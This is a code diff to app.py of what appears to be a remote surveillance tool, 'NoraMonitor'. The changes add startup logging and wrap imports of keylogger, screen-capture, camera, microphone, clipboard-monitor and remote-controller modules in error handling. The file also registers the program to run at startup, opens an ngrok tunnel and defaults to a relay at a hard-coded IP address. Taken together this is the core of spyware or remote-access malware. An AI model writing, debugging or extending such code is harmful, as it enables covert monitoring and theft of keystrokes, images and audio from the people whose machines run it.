@@ -1,20 +1,68 @@
 import os
 import sys
 import threading
-
-import keylogger as kl
-import screencap as sc
-import controller
-import recorder as rec
-import camera as cam
-import clipboard_monitor as cb
-import microphone as mic_mod
+import traceback
 
 PORT = int(os.environ.get("NORA_PORT", 9090))
 NGROK_TOKEN = os.environ.get("NGROK_TOKEN", "")
 NORA_RELAY = os.environ.get("NORA_RELAY", "http://84.200.81.161:5000")
 
 _APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
+_LOG_FILE       = os.path.join(_APP_DIR, "nora.log")
+
+def _log(msg):
+    try:
+        os.makedirs(_APP_DIR, exist_ok=True)
+        with open(_LOG_FILE, "a", encoding="utf-8") as f:
+            import datetime
+            f.write(f"[{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] {msg}\n")
+    except Exception:
+        pass
+
+_log("app.py starting")
+
+try:
+    import keylogger as kl
+    _log("keylogger OK")
+except Exception as e:
+    _log(f"keylogger FAIL: {e}")
+
+try:
+    import screencap as sc
+    _log("screencap OK")
+except Exception as e:
+    _log(f"screencap FAIL: {e}")
+
+try:
+    import controller
+    _log("controller OK")
+except Exception as e:
+    _log(f"controller FAIL: {e}")
+
+try:
+    import recorder as rec
+    _log("recorder OK")
+except Exception as e:
+    _log(f"recorder FAIL: {e}")
+
+try:
+    import camera as cam
+    _log("camera OK")
+except Exception as e:
+    _log(f"camera FAIL: {e}")
+
+try:
+    import clipboard_monitor as cb
+    _log("clipboard_monitor OK")
+except Exception as e:
+    _log(f"clipboard_monitor FAIL: {e}")
+
+try:
+    import microphone as mic_mod
+    _log("microphone OK")
+except Exception as e:
+    _log(f"microphone FAIL: {e}")
+
 _TOKEN_FILE     = os.path.join(_APP_DIR, "ngrok.token")
 _RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")
 
@@ -76,11 +124,14 @@ def _start_ngrok(port, broadcast_fn):
 
 
 def main():
+    _log("main() entered")
     import server
+    _log("server imported")
     relay = None
     if NORA_RELAY:
         import relay_client
         relay = relay_client
+        _log(f"relay_client imported, relay={NORA_RELAY}")
 
     recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)
 
@@ -123,9 +174,14 @@ def main():
         daemon=True,
     ).start()
 
+    _log(f"starting Flask server on port {PORT}")
     server.run(port=PORT)
 
 
 if __name__ == "__main__":
-    _register_startup()
-    main()
+    try:
+        _register_startup()
+        _log("startup registered, calling main()")
+        main()
+    except Exception:
+        _log("FATAL:\n" + traceback.format_exc())
